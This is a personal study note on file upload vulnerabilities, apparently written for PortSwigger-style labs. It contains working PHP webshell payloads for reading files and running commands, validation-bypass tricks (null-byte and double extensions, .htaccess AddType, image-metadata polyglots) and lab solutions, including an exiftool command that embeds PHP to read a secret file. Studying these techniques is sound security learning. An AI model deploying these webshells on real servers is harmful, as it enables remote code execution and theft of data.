These types of vulnerabilities arise when a web server does not enforce. In general [[Server Side#File Upload Vuln|Server-Side]]

# Theory
## Impact
**Depends on two factors**
- Which aspect of the file the website fails to validate --> enable user uploads
- What restrictions are imposed if the files are uploaded

**The Effects**
- In the worst case, attackers can send malicious server scripts  --> RCE
- Can overwrite files of the same name --> even in arbitrary locations
- DoS if file is too big and server fails to limit it

## Static File Handling

**How does the server handle static files?**
The path of each request can be mapped 1:1 to the location of the files.
However, nowadays static files are not common but still exists with stylesheets, images, etc.

**The Handling**
The server parses the path in the request, for example to identify the file extension and comparing it to MIME types:
- If file type is **non-executable**, just send the content in an HTTP response
- If its **executable**, and the server is **configured to execute** this file type, it will assign variables based on headers and parameters, then run the script. The result is sent in an HTTP response
- If its **executable**, but server is **not configured to execute**, it will result in an error. But a bad error handling may send the contents of the file to the server anyway.

>[!tip]
>The `Content-Type` response header may provide clues as to what kind of file the server thinks it has served. If this header hasn't been explicitly set by the application code, it normally contains the result of the file extension/MIME type mapping.


# Attacks
Some PHP webshell payload examples:
- Read Arbitrary Files
	- `<?php echo file_get_contents('/path/to/target/file'); ?>`
- Pass arbitrary commands via query parameter
	- `<?php echo system($_GET['command']); ?>`
	- `GET /example/exploit.php?command=id HTTP/1.1`

>[!note]
>Pay attention to how the server handles the files, based on the server's mechanism towards the type of file it thinks it is (`Content-Type`).

**Vulnerabilities**
- Unrestricted file upload
- **Flawed file type validation**
	- If using `multipart/form-data` the `Content-Type` may not be assigned correctly
	- `Content-Type` can be misleading, it can also be modified
	- Lesser known filetypes (that still works the same) can be used
- File execution is prohibited, but only for directories where user uploaded contents are stored
- **Insufficient blacklisting of filetypes**: example: `.php5` (obscure but works the same as php)
- **Extension obfuscation**: 
	- different cases
	- extra trailing dots
	- double extension (`file.php.jpg`)
	- url encoded chars (can also use NULL bytes)
	- multibyte unicode characters.
	- **Non-recursive** sanitation
	- etc.
- **Flawed file content validation
	- Example: an image should have dimensions (height, width), if it doesnt then its not an image. This validation should be done for images.
	- File headers validation
	- Malicious code can still be injected in metadata of images (**polyglot files**)

>[!tip]
>Web servers often use the `filename` field in `multipart/form-data` requests to determine the name and location where the file should be saved.

**TRICKING INTO EXECUTING NON PHP FILES WITH `.htaccess`: APACHE**
Other server configuration can be overrided to do allow certain things.

# Extra
## Solutions for Labs
### Lab: Web shell upload via extension blacklist bypass
- Requires the `.htaccess` file):
```php
AddType application/x-httpd-php .php5
```
- Upload file using `.php5` (unrestricted)

### Lab: Web shell upload via obfuscated file extension
- Upload file with extension `.php%00.jpg`
- Get file in the `.php` url only

### Lab: Remote code execution via polyglot web shell upload
- Upload a php file that has the contents of a jpeg file
- In the php file, add a comment metadata:
```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>"
```
## Dictionary
- IIS - Internet Information Services
